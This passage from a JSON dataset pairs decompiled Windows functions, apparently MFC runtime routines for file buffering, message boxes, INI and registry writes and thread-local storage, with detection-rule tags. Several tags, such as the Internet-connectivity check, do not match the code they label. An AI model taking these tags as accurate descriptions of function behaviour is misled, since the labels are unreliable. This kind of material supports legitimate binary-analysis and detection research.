uVar3 = uVar3 - var_8h;\n            if (var_8h == iVar1) {\n                uVar4 = 0;\n                if (*(in_ECX + 8) == 0) {\n                    var_4h = uVar3;\n                    if (uVar3 <= *(in_ECX + 0x1c)) {\n                        var_4h = *(in_ECX + 0x1c);\n                    }\n                    var_8h = *(in_ECX + 0x2c);\n                    do {\n                        iVar1 = (**(**(in_ECX + 0x20) + 0x34))(var_8h, var_4h);\n                        var_8h = var_8h + iVar1;\n                        var_4h = var_4h - iVar1;\n                        uVar4 = uVar4 + iVar1;\n                        if ((iVar1 == 0) || (var_4h == 0)) break;\n                    } while (uVar4 < uVar3);\n                    iVar1 = *(in_ECX + 0x2c);\n                    *(in_ECX + 0x24) = iVar1;\n                    *(in_ECX + 0x28) = iVar1 + uVar4;\n                }\n                else {\n                    (**(**(in_ECX + 0x20) + 0x50))(0, *(in_ECX + 0x1c), in_ECX + 0x2c, in_ECX + 0x28);\n                    iVar1 = *(in_ECX + 0x2c);\n                    *(in_ECX + 0x24) = iVar1;\n                }\n                uVar4 = *(in_ECX + 0x28) - iVar1;\n                if (uVar3 < uVar4) {\n                    uVar4 = uVar3;\n                }\n                fcn.0040bb50(arg_8h, iVar1, uVar4);\n                *(in_ECX + 0x24) = *(in_ECX + 0x24) + uVar4;\n                uVar3 = uVar3 - uVar4;\n            }\n        }\n        iVar1 = arg_ch - uVar3;\n    }\n    return iVar1;\n}\n",
        "token_count": 871
    },
    "004228c3": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004228c3(int32_t arg_8h, uint32_t arg_ch)\n\n{\n    int32_t in_ECX;\n    uint32_t arg_10h;\n    int32_t iVar1;\n    \n    if (arg_ch != 0) {\n        arg_10h = *(in_ECX + 0x28) - *(in_ECX + 0x24);\n        if (arg_ch < arg_10h) {\n            arg_10h = arg_ch;\n        }\n        fcn.0040bb50(*(in_ECX + 0x24), arg_8h, arg_10h);\n        *(in_ECX + 0x24) = *(in_ECX + 0x24) + arg_10h;\n        arg_ch = arg_ch - arg_10h;\n        if (arg_ch != 0) {\n            fcn.00422953();\n            iVar1 = arg_ch - arg_ch % *(in_ECX + 0x1c);\n            (**(**(in_ECX + 0x20) + 0x38))(arg_8h + arg_10h, iVar1);\n            if (*(in_ECX + 8) != 0) {\n                (**(**(in_ECX + 0x20) + 0x50))(1, *(in_ECX + 0x1c), in_ECX + 0x2c, in_ECX + 0x28);\n                *(in_ECX + 0x24) = *(in_ECX + 0x2c);\n            }\n            fcn.0040bb50(*(in_ECX + 0x24), arg_8h + arg_10h + iVar1, arg_ch - iVar1);\n            *(in_ECX + 0x24) = *(in_ECX + 0x24) + (arg_ch - iVar1);\n        }\n    }\n    return;\n}\n",
        "token_count": 416
    },
    "00422b4a": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00422b4a(uint lpText, uint32_t arg_ch, int32_t arg_10h)\n\n{\n    int32_t *piVar1;\n    uint32_t uVar2;\n    uint uVar3;\n    int32_t in_ECX;\n    uint *puVar4;\n    uint var_114h;\n    uint var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t hWnd;\n    \n    fcn.00422b1c(0);\n    var_ch = fcn.00422cc2(0, &hWnd);\n    if (((var_ch == 0) || (piVar1 = (*_sym.imp.USER32.dll_SendMessageA)(hWnd, 0x376, 0, 0),  piVar1 == NULL)) &&\n       (piVar1 = NULL,  in_ECX != 0)) {\n        piVar1 = in_ECX + 0x9c;\n    }\n    var_8h = 0;\n    if ((piVar1 != NULL) && (var_8h = *piVar1,  arg_10h != 0)) {\n        *piVar1 = arg_10h + 0x30000;\n    }\n    if (((arg_ch & 0xf0) == 0) && ((uVar2 = arg_ch & 0xf,  uVar2 < 2 || ((2 < uVar2 && (uVar2 < 5)))))) {\n        arg_ch = arg_ch | 0x30;\n    }\n    if (in_ECX == 0) {\n        puVar4 = &var_114h;\n        (*_sym.imp.KERNEL32.dll_GetModuleFileNameA)(0, &var_114h, 0x104);\n    }\n    else {\n        puVar4 = *(in_ECX + 0x78);\n    }\n    uVar3 = (*_sym.imp.USER32.dll_MessageBoxA)(var_ch, lpText, puVar4, arg_ch);\n    if (piVar1 != NULL) {\n        *piVar1 = var_8h;\n    }\n    if (hWnd != 0) {\n        (*_sym.imp.USER32.dll_EnableWindow)(hWnd, 1);\n    }\n    fcn.00422b1c(1);\n    return uVar3;\n}\n",
        "token_count": 515
    },
    "00422d6a": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00422d6a(int32_t arg_8h)\n\n{\n    int32_t in_ECX;\n    \n    fcn.0042028c(arg_8h, &arg_8h);\n    if (arg_8h == 0) {\n        fcn.0041b381();\n    }\n    *(in_ECX + 0xc) = 0;\n    *(in_ECX + 8) = arg_8h;\n    return;\n}\n",
        "token_count": 105
    },
    "00422eba": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00422eba(uint lpAppName, uint lpValueName, uint arg_10h)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    int32_t in_ECX;\n    uint lpString;\n    \n    if (*(in_ECX + 0x7c) == 0) {\n        (*_sym.imp.USER32.dll_wsprintfA)(&lpString, 0x42a6b4, arg_10h);\n        uVar1 = (*_sym.imp.KERNEL32.dll_WritePrivateProfileStringA)(lpAppName, lpValueName, &lpString, *(in_ECX + 0x90))\n        ;\n    }\n    else {\n        uVar1 = fcn.004249f3(lpAppName);\n        if (uVar1 != 0) {\n            iVar2 = (*_sym.imp.ADVAPI32.dll_RegSetValueExA)(uVar1, lpValueName, 0, 4, &arg_10h, 4);\n            (*_sym.imp.ADVAPI32.dll_RegCloseKey)(uVar1);\n            uVar1 = iVar2 == 0;\n        }\n    }\n    return uVar1;\n}\n",
        "token_count": 259
    },
    "0042328e": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0042328e(int32_t *arg_8h, uint8_t *arg_ch, int32_t arg_10h, int32_t arg_14h)\n\n{\n    uint8_t uVar1;\n    uint8_t uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint8_t *puVar5;\n    \n    iVar4 = 0;\n    uVar1 = *arg_ch;\n    puVar5 = arg_ch;\n    while (uVar1 != 0) {\n        if (*puVar5 == 0x25) {\n            uVar1 = puVar5[1];\n            if ((uVar1 < '0') || ('9' < uVar1)) {\n                if ((uVar1 < 'A') || ('Z' < uVar1)) goto code_r0x004232e7;\n                if (uVar1 < ':') goto code_r0x004232c5;\n                iVar3 = uVar1 + -0x38;\n            }\n            else {\ncode_r0x004232c5:\n                iVar3 = uVar1 + -0x31;\n            }\n            puVar5 = puVar5 + 2;\n            if (arg_14h <= iVar3) goto code_r0x004232f6;\n            iVar3 = *(arg_10h + iVar3 * 4);\n            if (iVar3 != 0) {\n                iVar3 = (*_sym.imp.KERNEL32.dll_lstrlenA)(iVar3);\n                iVar4 = iVar4 + iVar3;\n            }\n        }\n        else {\ncode_r0x004232e7:\n            if ((*(*puVar5 + 0x44f281) & 4) != 0) {\n                iVar4 = iVar4 + 1;\n                puVar5 = puVar5 + 1;\n            }\n            puVar5 = puVar5 + 1;\ncode_r0x004232f6:\n            iVar4 = iVar4 + 1;\n        }\n        uVar1 = *puVar5;\n    }\n    puVar5 = fcn.0041d546(iVar4);\n    do {\n        while( true ) {\n            if (*arg_ch == 0) {\n                fcn.0041d595(puVar5 - *arg_8h);\n                return;\n            }\n            uVar1 = *arg_ch;\n            if (uVar1 == 0x25) break;\ncode_r0x00423364:\n            if ((*(uVar1 + 0x44f281) & 4) != 0) {\n                *puVar5 = uVar1;\n                puVar5 = puVar5 + 1;\n                arg_ch = arg_ch + 1;\n            }\n            *puVar5 = *arg_ch;\n            puVar5 = puVar5 + 1;\n            arg_ch = arg_ch + 1;\n        }\n        uVar2 = arg_ch[1];\n        if ((uVar2 < '0') || ('9' < uVar2)) {\n            if ((uVar2 < 'A') || ('Z' < uVar2)) goto code_r0x00423364;\n            if (uVar2 < ':') goto code_r0x00423334;\n            iVar4 = uVar2 + -0x38;\n        }\n        else {\ncode_r0x00423334:\n            iVar4 = uVar2 + -0x31;\n        }\n        arg_ch = arg_ch + 2;\n        if (iVar4 < arg_14h) {\n            iVar4 = *(arg_10h + iVar4 * 4);\n            if (iVar4 != 0) {\n                (*_sym.imp.KERNEL32.dll_lstrcpyA)(puVar5, iVar4);\n                iVar4 = (*_sym.imp.KERNEL32.dll_lstrlenA)(puVar5);\n                puVar5 = puVar5 + iVar4;\n            }\n        }\n        else {\n            *puVar5 = 0x3f;\n            puVar5 = puVar5 + 1;\n        }\n    } while( true );\n}\n",
        "token_count": 889
    },
    "00423483": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00423483(uint *arg_8h)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint uVar4;\n    int32_t *in_ECX;\n    uint var_4h;\n    \n    uVar4 = *0x44d714;\n    uVar3 = *0x44d710;\n    if (in_ECX != NULL) {\n        iVar2 = (*_sym.imp.GDI32.dll_GetMapMode)(in_ECX[2]);\n        pcVar1 = _sym.imp.GDI32.dll_GetDeviceCaps;\n        if ((iVar2 < 7) && (iVar2 != 1)) {\n            (**(*in_ECX + 0x34))(3);\n            fcn.004220f5(arg_8h);\n            (**(*in_ECX + 0x34))(iVar2);\n            return;\n        }\n        uVar3 = (*_sym.imp.GDI32.dll_GetDeviceCaps)(in_ECX[2], 0x58);\n        uVar4 = (*pcVar1)(in_ECX[2], 0x5a);\n    }\n    pcVar1 = _sym.imp.KERNEL32.dll_MulDiv;\n    uVar3 = (*_sym.imp.KERNEL32.dll_MulDiv)(*arg_8h, 0x9ec, uVar3);\n    *arg_8h = uVar3;\n    uVar4 = (*pcVar1)(arg_8h[1], 0x9ec, uVar4);\n    arg_8h[1] = uVar4;\n    return;\n}\n",
        "token_count": 353
    },
    "00423511": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00423511(uint *arg_8h)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint uVar4;\n    int32_t *in_ECX;\n    uint var_4h;\n    \n    uVar4 = *0x44d714;\n    uVar3 = *0x44d710;\n    if (in_ECX != NULL) {\n        iVar2 = (*_sym.imp.GDI32.dll_GetMapMode)(in_ECX[2]);\n        pcVar1 = _sym.imp.GDI32.dll_GetDeviceCaps;\n        if ((iVar2 < 7) && (iVar2 != 1)) {\n            (**(*in_ECX + 0x34))(3);\n            fcn.0042208c(arg_8h);\n            (**(*in_ECX + 0x34))(iVar2);\n            return;\n        }\n        uVar3 = (*_sym.imp.GDI32.dll_GetDeviceCaps)(in_ECX[2], 0x58);\n        uVar4 = (*pcVar1)(in_ECX[2], 0x5a);\n    }\n    pcVar1 = _sym.imp.KERNEL32.dll_MulDiv;\n    uVar3 = (*_sym.imp.KERNEL32.dll_MulDiv)(*arg_8h, uVar3, 0x9ec);\n    *arg_8h = uVar3;\n    uVar4 = (*pcVar1)(arg_8h[1], uVar4, 0x9ec);\n    arg_8h[1] = uVar4;\n    return;\n}\n",
        "token_count": 353
    },
    "00423f28": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid fcn.00423f28(void)\n\n{\n    uint *puVar1;\n    uint uVar2;\n    code **extraout_ECX;\n    code *pcVar3;\n    int32_t unaff_EBP;\n    uint *in_FS_OFFSET;\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    \n    fcn.0040b7d8();\n    *(unaff_EBP + -0x10) = extraout_ECX;\n    *extraout_ECX = vtable.AFX_MODULE_THREAD_STATE.0;\n    puVar1 = extraout_ECX[5];\n    *(unaff_EBP + -4) = 0;\n    if (puVar1 != NULL) {\n        (***puVar1)(1);\n    }\n    if (extraout_ECX[6] != NULL) {\n        (***extraout_ECX[6])(1);\n    }\n    if (extraout_ECX[7] != NULL) {\n        (***extraout_ECX[7])(1);\n    }\n    if (extraout_ECX[8] != NULL) {\n        (***extraout_ECX[8])(1);\n    }\n    if (extraout_ECX[9] != NULL) {\n        (***extraout_ECX[9])(1);\n    }\n    pcVar3 = extraout_ECX[0xe];\n    if (pcVar3 != NULL) {\n        while (*(pcVar3 + 0xc) != 0) {\n            uVar2 = fcn.0041b77c();\n            fcn.0041bd2d(uVar2);\n            pcVar3 = extraout_ECX[0xe];\n        }\n    }\n    if (extraout_ECX[0xc] != NULL) {\n        (**(*extraout_ECX[0xc] + 4))(1);\n    }\n    if (extraout_ECX[0xd] != NULL) {\n        (**(*extraout_ECX[0xd] + 4))(1);\n    }\n    if (extraout_ECX[0xe] != NULL) {\n        (**(*extraout_ECX[0xe] + 4))(1);\n    }\n    *in_FS_OFFSET = *(unaff_EBP + -0xc);\n    return;\n}\n",
        "token_count": 516
    },
    "004243f4": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid fcn.004243f4(int32_t param_1)\n\n{\n    if (param_1 != 0) {\n        (*_sym.imp.KERNEL32.dll_LocalFree)(param_1);\n    }\n    return;\n}\n",
        "token_count": 50
    },
    "00424610": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00424610(int32_t arg_8h, int32_t arg_ch)\n\n{\n    code **ppcVar1;\n    code *pcVar2;\n    uint *in_ECX;\n    code **ppcVar3;\n    uint var_4h;\n    \n    ppcVar1 = (*_sym.imp.KERNEL32.dll_TlsGetValue)(*in_ECX);\n    if (ppcVar1 == NULL) {\n        ppcVar1 = fcn.004243d6(0x10);\n        if (ppcVar1 == NULL) {\n            ppcVar1 = NULL;\n        }\n        else {\n            *ppcVar1 = vtable.CThreadData.0;\n        }\n        ppcVar1[2] = NULL;\n        ppcVar1[3] = NULL;\n        ppcVar3 = ppcVar1 + 2;\n        (*_sym.imp.KERNEL32.dll_EnterCriticalSection)(in_ECX + 7);\n        fcn.0042437d(ppcVar1);\n        (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(in_ECX + 7);\n    }\n    else {\n        ppcVar3 = ppcVar1 + 2;\n        if ((arg_8h < *ppcVar3) || (arg_ch == 0)) goto code_r0x004246e7;\n    }\n    if (ppcVar1[3] == NULL) {\n        pcVar2 = (*_sym.imp.KERNEL32.dll_LocalAlloc)(0, in_ECX[3] << 2);\n    }\n    else {\n        pcVar2 = (*_sym.imp.KERNEL32.dll_LocalReAlloc)(ppcVar1[3], in_ECX[3] << 2, 2);\n    }\n    ppcVar1[3] = pcVar2;\n    if (pcVar2 == NULL) {\n        fcn.0041b368();\n    }\n    fcn.0040b990(ppcVar1[3] + *ppcVar3 * 4, 0, (*ppcVar3 * 0x3fffffff + in_ECX[3]) * 4);\n    *ppcVar3 = in_ECX[3];\n    (*_sym.imp.KERNEL32.dll_TlsSetValue)(*in_ECX, ppcVar1);\ncode_r0x004246e7:\n    *(ppcVar1[3] + arg_8h * 4) = arg_ch;\n    return;\n}\n",
        "token_count": 536
    },
    "00424716": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00424716(uint *arg_8h, int32_t arg_ch)\n\n{\n    uint *puVar1;\n    bool bVar2;\n    uint *in_ECX;\n    int32_t iVar3;\n    uint var_4h;\n    \n    iVar3 = 1;\n    bVar2 = true;\n    if (1 < arg_8h[2]) {\n        do {\n            if ((arg_ch == 0) || (*(in_ECX[4] + 4 + iVar3 * 8) == arg_ch)) {\n                puVar1 = *(arg_8h[3] + iVar3 * 4);\n                if (puVar1 != NULL) {\n                    (***puVar1)(1);\n                }\n                *(arg_8h[3] + iVar3 * 4) = 0;\n            }\n            else if (*(arg_8h[3] + iVar3 * 4) != 0) {\n                bVar2 = false;\n            }\n            iVar3 = iVar3 + 1;\n        } while (iVar3 < arg_8h[2]);\n        if (!bVar2) {\n            return;\n        }\n    }\n    (*_sym.imp.KERNEL32.dll_EnterCriticalSection)(in_ECX + 7);\n    fcn.00424390(arg_8h);\n    (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(in_ECX + 7);\n    (*_sym.imp.KERNEL32.dll_LocalFree)(arg_8h[3]);\n    if (arg_8h != NULL) {\n        (***arg_8h)(1);\n    }\n    (*_sym.imp.KERNEL32.dll_TlsSetValue)(*in_ECX, 0);\n    return;\n}\n",
        "token_count": 372
    },
    "004247af": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.004247af(uint *param_1, int32_t param_2, uint param_3)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint unaff_retaddr;\n    \n    (*_sym.imp.KERNEL32.dll_EnterCriticalSection)(param_1 + 7);\n    if (param_2 == 0) {\n        iVar2 = (*_sym.imp.KERNEL32.dll_TlsGetValue)(*param_1);\n        if (iVar2 != 0) {\n            fcn.00424716(iVar2, unaff_retaddr);\n        }\n    }\n    else {\n        iVar2 = param_1[5];\n        while (iVar2 != 0) {\n            iVar1 = *(iVar2 + 4);\n            fcn.00424716(iVar2, param_3);\n            iVar2 = iVar1;\n        }\n    }\n    (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(param_1 + 7);\n    return;\n}\n",
        "token_count": 216
    },
    "00424808": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x0042482f)\n\nint32_t __fastcall fcn.00424808(int32_t *param_1)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    code *unaff_retaddr;\n    \n    if (*param_1 == 0) {\n        if (*0x44d38c == NULL) {\n            *0x44d38c = fcn.00424408();\n        }\n        iVar1 = fcn.004244a1();\n        *param_1 = iVar1;\n    }\n    iVar1 = *param_1;\n    iVar2 = (*_sym.imp.KERNEL32.dll_TlsGetValue)(**0x44d38c);\n    if ((iVar2 == 0) || (*(iVar2 + 8) <= iVar1)) {\n        iVar1 = 0;\n    }\n    else {\n        iVar1 = *(*(iVar2 + 0xc) + iVar1 * 4);\n    }\n    if (iVar1 == 0) {\n        iVar1 = (*unaff_retaddr)();\n        fcn.00424610(*param_1, iVar1);\n    }\n    return iVar1;\n}\n",
        "token_count": 257
    },
    "004248f8": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004248f8(int32_t *param_1)\n\n{\n    uint var_4h;\n    \n    if (*param_1 != 0) {\n        if (*param_1 != NULL) {\n            (****param_1)(1);\n        }\n    }\n    return;\n}\n",
        "token_count": 66
    },
    "00424aa9": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "get OS version"
        ],
        "decompiled_code": "\nint32_t fcn.00424aa9(void)\n\n{\n    uint32_t uVar1;\n    \n    if (*0x44d6f4 == 0) {\n        *0x44d6f4 = 1;\n        uVar1 = (*_sym.imp.KERNEL32.dll_GetVersion)();\n        if ((uVar1 < 4) && ((uVar1 & 0x80000000) != 0)) {\n            *0x44d6f0 = 1;\n        }\n        else {\n            *0x44d6f0 = 0;\n            (*_sym.imp.KERNEL32.dll_InitializeCriticalSection)(0x44d540);\n        }\n    }\n    return *0x44d6f4;\n}\n",
        "token_count": 161
    },
    "00424b3c": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid fcn.00424b3c(int32_t param_1)\n\n{\n    int32_t *piVar1;\n    code *pcVar2;\n    \n    if (*0x44d6f4 == 0) {\n        fcn.00424aa9();\n    }\n    pcVar2 = _sym.imp.KERNEL32.dll_EnterCriticalSection;\n    if (*0x44d6f0 == 0) {\n        piVar1 = param_1 * 4 + 0x44d4f8;\n        if (*(param_1 * 4 + 0x44d4f8) == 0) {\n            (*_sym.imp.KERNEL32.dll_EnterCriticalSection)(0x44d540);\n            if (*piVar1 == 0) {\n                (*_sym.imp.KERNEL32.dll_InitializeCriticalSection)(param_1 * 0x18 + 0x44d558);\n                *piVar1 = *piVar1 + 1;\n            }\n            (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(0x44d540);\n        }\n        (*pcVar2)(param_1 * 0x18 + 0x44d558);\n    }\n    return;\n}\n",
        "token_count": 259
    },
    "00424bac": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid fcn.00424bac(int32_t param_1)\n\n{\n    if (*0x44d6f0 == 0) {\n        (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(param_1 * 0x18 + 0x44d558);\n    }\n    return;\n}\n",
        "token_count": 66
    },
    "00424bf7": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid fcn.00424bf7(void)\n\n{\n    code *pcVar1;\n    \n    pcVar1 = _sym.imp.USER32.dll_GetSystemMetrics;\n    if (*0x44d754 != 0) {\n        *0x44d6f8 = (*_sym.imp.USER32.dll_GetSystemMetrics)(2);\n        *0x44d6f8 = *0x44d6f8 + 1;\n        *0x44d6fc = (*pcVar1)(3);\n        *0x44d6fc = *0x44d6fc + 1;\n        *0x44d760 = 1;\n    }\n    return;\n}\n",
        "token_count": 146
    },
    "00424e03": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint fcn.00424e03(uint param_1, uint param_2)\n\n{\n    code *pcVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint unaff_ESI;\n    uint unaff_retaddr;\n    \n    pcVar1 = _sym.imp.KERNEL32.dll_SetErrorMode;\n    uVar2 = (*_sym.imp.KERNEL32.dll_SetErrorMode)(0);\n    (*pcVar1)(uVar2 | 0x8001);\n    iVar3 = fcn.00423ff7();\n    *(iVar3 + 8) = unaff_ESI;\n    *(iVar3 + 0xc) = unaff_ESI;\n    iVar3 = fcn.00423ff7();\n    iVar3 = *(iVar3 + 4);\n    if (iVar3 != 0) {\n        *(iVar3 + 0x68) = unaff_ESI;\n        *(iVar3 + 0x6c) = unaff_retaddr;\n        *(iVar3 + 0x70) = param_1;\n        *(iVar3 + 0x74) = param_2;\n        fcn.00424e66();\n    }\n    iVar3 = fcn.00423ff7();\n    if (*(iVar3 + 0x14) == '\\0') {\n        fcn.0041bd4d();\n    }\n    return 1;\n}\n",
        "token_count": 302
    },
    "00424e66": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00424e66(int32_t param_1)\n\n{\n    uchar *puVar1;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t iVar4;\n    uint *puVar5;\n    uint var_30ch;\n    uint lpFilename;\n    uint var_108h;\n    uchar *var_4h;\n    \n    iVar2 = fcn.00423ff7();\n    *(iVar2 + 8) = *(param_1 + 0x68);\n    *(iVar2 + 0xc) = *(param_1 + 0x68);\n    (*_sym.imp.KERNEL32.dll_GetModuleFileNameA)(*(param_1 + 0x68), &lpFilename, 0x104);\n    var_4h = fcn.0040bf50(&lpFilename, 0x2e);\n    *var_4h = 0;\n    fcn.00424f83(&lpFilename, &var_108h, 0x104);\n    if (*(param_1 + 0x88) == 0) {\n        uVar3 = fcn.0040b7f7(&var_108h);\n        *(param_1 + 0x88) = uVar3;\n    }\n    if (*(param_1 + 0x78) == 0) {\n        iVar4 = fcn.00420632(0xe000, &var_30ch, 0x100);\n        if (iVar4 == 0) {\n            puVar5 = *(param_1 + 0x88);\n        }\n        else {\n            puVar5 = &var_30ch;\n        }\n        uVar3 = fcn.0040b7f7(puVar5);\n        *(param_1 + 0x78) = uVar3;\n    }\n    puVar1 = var_4h;\n    *(iVar2 + 0x10) = *(param_1 + 0x78);\n    if (*(param_1 + 0x8c) == 0) {\n        (*_sym.imp.KERNEL32.dll_lstrcpyA)(var_4h, \".HLP\");\n        uVar3 = fcn.0040b7f7(&lpFilename);\n        *(param_1 + 0x8c) = uVar3;\n        *puVar1 = 0;\n    }\n    if (*(param_1 + 0x90) == 0) {\n        (*_sym.imp.KERNEL32.dll_lstrcatA)(&var_108h, \".INI\");\n        uVar3 = fcn.0040b7f7(&var_108h);\n        *(param_1 + 0x90) = uVar3;\n    }\n    return;\n}\n",
        "token_count": 598
    },
    "00424f83": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nint32_t fcn.00424f83(char *param_1, int32_t param_2, uint param_3)\n\n{\n    char cVar1;\n    char *pcVar2;\n    int32_t iVar3;\n    \n    pcVar2 = param_1;\n    for (; *param_1 != '\\0'; param_1 = fcn.0040bf39(param_1)) {\n        cVar1 = *param_1;\n        if (((cVar1 == '\\\\') || (cVar1 == '/')) || (cVar1 == ':')) {\n            pcVar2 = fcn.0040bf39(param_1);\n        }\n    }\n    if (param_2 == 0) {\n        iVar3 = (*_sym.imp.KERNEL32.dll_lstrlenA)(pcVar2);\n        iVar3 = iVar3 + 1;\n    }\n    else {\n        (*_sym.imp.KERNEL32.dll_lstrcpynA)(param_2, pcVar2, param_3);\n        iVar3 = 0;\n    }\n    return iVar3;\n}\n",
        "token_count": 231
    },
    "00425111": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
